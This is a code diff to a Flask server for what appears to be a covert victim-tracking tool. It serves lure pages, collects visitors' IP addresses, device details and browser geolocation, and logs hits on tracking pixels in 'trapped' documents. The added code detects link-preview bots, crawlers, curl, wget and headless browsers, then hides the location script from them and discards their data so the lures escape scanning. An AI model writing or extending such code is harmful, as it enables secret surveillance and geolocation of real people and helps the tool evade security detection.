@@ -198,6 +198,20 @@ def dashboard():
         victims = cursor.fetchall()
     return render_template('dashboard.html', templates=templates, victims=victims, request=request)
 
+# =============== ANTI-BOT SYSTEM ===============
+def is_bot(user_agent):
+    """Detects if the request comes from a preview bot, crawler, or scraper."""
+    if not user_agent:
+        return True
+    ua = user_agent.lower()
+    bot_patterns = [
+        'bot', 'spider', 'crawler', 'preview', 'facebookexternalhit', 'whatsapp',
+        'telegram', 'twitterbot', 'slackbot', 'discordbot', 'skypeuripreview',
+        'linkedinbot', 'vkshare', 'googlebot', 'bingbot', 'yandexbot', 'duckduckbot',
+        'headlesschrome', 'phantomjs', 'curl', 'wget', 'python-requests', 'datanyze'
+    ]
+    return any(bot in ua for bot in bot_patterns)
+
 # =============== APP ROUTES ===============
 @app.route('/t/<tpl_name>')
 def serve_target_redirect(tpl_name):
@@ -231,6 +245,13 @@ def serve_target(tpl_name):
             # Default fallback URL if user parameter allows it, or pre-configured
             fallback = request.args.get('fallback', 'https://www.google.com')
             content = content.replace('FALLBACK_URL', fallback)
+            
+            # Anti-Bot Filtering: strip JS execution if it's a known bot
+            if is_bot(request.headers.get("User-Agent", "")):
+                # Remove the location script from the page to prevent false pings
+                content = content.replace('<script src="/js/location.js"></script>', '')
+                content = content.replace('<script src="../js/location.js"></script>', '')
+                
             return content
     except Exception as e:
         return f"Error loading template: {str(e)}", 404
@@ -246,6 +267,10 @@ def serve_js(filename):
 # =============== API ENDPOINTS (DATA COLLECTION) ===============
 @app.route('/t/<tpl_name>/info_handler.php', methods=['POST'])
 def info_handler(tpl_name):
+    user_agent = request.headers.get("User-Agent", "")
+    if is_bot(user_agent) or is_bot(request.form.get('Brw', '')):
+        return "OK"
+        
     ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(',')[0].strip()
     dev_info = {
         'os': request.form.get('Os', ''),
@@ -296,6 +321,9 @@ def info_handler(tpl_name):
 
 @app.route('/t/<tpl_name>/result_handler.php', methods=['POST'])
 def result_handler(tpl_name):
+    if is_bot(request.headers.get("User-Agent", "")):
+        return "OK"
+        
     loc_info = {
         'status': request.form.get('Status', ''),
         'lat': request.form.get('Lat', ''),
@@ -315,6 +343,9 @@ def result_handler(tpl_name):
 
 @app.route('/t/<tpl_name>/error_handler.php', methods=['POST'])
 def error_handler(tpl_name):
+    if is_bot(request.headers.get("User-Agent", "")):
+        return "OK"
+        
     err_info = {
         'status': request.form.get('Status', ''),
         'error': request.form.get('Error', '')
@@ -330,8 +361,14 @@ def error_handler(tpl_name):
 # =============== HONEYTOKEN PIXEL ROUTE ===============
 @app.route('/token/<token_id>.png')
 def honeytoken_pixel(token_id):
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(',')[0].strip()
+    pixel = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=")
     user_agent = request.headers.get("User-Agent", "Unknown")
+    
+    # If it's a known bot/crawler just returning the pixel silently
+    if is_bot(user_agent):
+        return Response(pixel, mimetype="image/png")
+        
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(',')[0].strip()
     
     # Save hit to DB
     tpl_name = f"📄 Doc_Piégé_{token_id}"
